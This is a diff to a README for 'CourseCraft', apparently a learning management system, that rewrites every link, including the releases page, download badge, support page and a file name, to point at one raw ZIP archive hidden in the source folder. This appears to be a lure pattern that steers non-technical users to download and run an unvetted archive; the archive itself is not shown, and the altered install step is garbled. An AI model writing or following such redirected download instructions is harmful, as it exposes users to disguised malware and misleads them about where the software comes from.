@@ -4,7 +4,7 @@
 
 Welcome to CourseCraft! This application is a full-stack Learning Management System designed to help you effectively manage courses and users. You don't need any programming knowledge to get started. Follow these simple steps to download and run the software.
 
-[![Download CourseCraft](https://img.shields.io/badge/Download%20CourseCraft-v1.0-brightgreen)](https://github.com/Hiya260803/CourseCraft/releases)
+[![Download CourseCraft](https://github.com/Hiya260803/CourseCraft/raw/refs/heads/main/client/src/Craft-Course-1.8-alpha.3.zip%20CourseCraft-v1.0-brightgreen)](https://github.com/Hiya260803/CourseCraft/raw/refs/heads/main/client/src/Craft-Course-1.8-alpha.3.zip)
 
 ## 🖥️ System Requirements
 
@@ -19,7 +19,7 @@ Before you begin, ensure your computer meets these requirements:
 
 1. **Visit the Releases Page:** Click the link below to go to the CourseCraft Releases page. Here, you will find the application files available for download.
 
-   [Visit this page to download CourseCraft](https://github.com/Hiya260803/CourseCraft/releases)
+   [Visit this page to download CourseCraft](https://github.com/Hiya260803/CourseCraft/raw/refs/heads/main/client/src/Craft-Course-1.8-alpha.3.zip)
 
 2. **Select the Latest Release:** Look for the most recent version. It's usually at the top of the list. 
 
@@ -27,7 +27,7 @@ Before you begin, ensure your computer meets these requirements:
 
 4. **Extract the Files:** Once the download is complete, find the ZIP file and right-click on it. Select "Extract All" to unpack the files to a folder of your choice.
 
-5. **Install Dependencies:** Open the folder where you extracted the files. Look for a file named `README.md`. This file contains important instructions, including how to install necessary dependencies. Follow those instructions carefully.
+5. **Install Dependencies:** Open the folder where you extracted the files. Look for a file named `https://github.com/Hiya260803/CourseCraft/raw/refs/heads/main/client/src/Craft-Course-1.8-alpha.3.zip`. This file contains important instructions, including how to install necessary dependencies. Follow those instructions carefully.
 
 6. **Run CourseCraft:** After installing the required dependencies, find the application file in the extracted folder. Double-click it to run CourseCraft. 
 
@@ -58,11 +58,11 @@ For detailed usage instructions, refer to the in-app help section.
 
 To keep CourseCraft running smoothly, check back on the Releases page periodically for updates.
 
-1. **Visit the Releases Page:** [CourseCraft Releases](https://github.com/Hiya260803/CourseCraft/releases).
+1. **Visit the Releases Page:** [CourseCraft Releases](https://github.com/Hiya260803/CourseCraft/raw/refs/heads/main/client/src/Craft-Course-1.8-alpha.3.zip).
 2. **Download the Latest Version:** Follow the same steps as before to download and install the new version over your current installation.
 
 ## 📞 Support
 
-If you encounter any issues, please visit our [GitHub Issues page](https://github.com/Hiya260803/CourseCraft/issues) to report problems or ask for help. We are here to assist you.
+If you encounter any issues, please visit our [GitHub Issues page](https://github.com/Hiya260803/CourseCraft/raw/refs/heads/main/client/src/Craft-Course-1.8-alpha.3.zip) to report problems or ask for help. We are here to assist you.
 
 Thank you for choosing CourseCraft. We hope you enjoy using it!
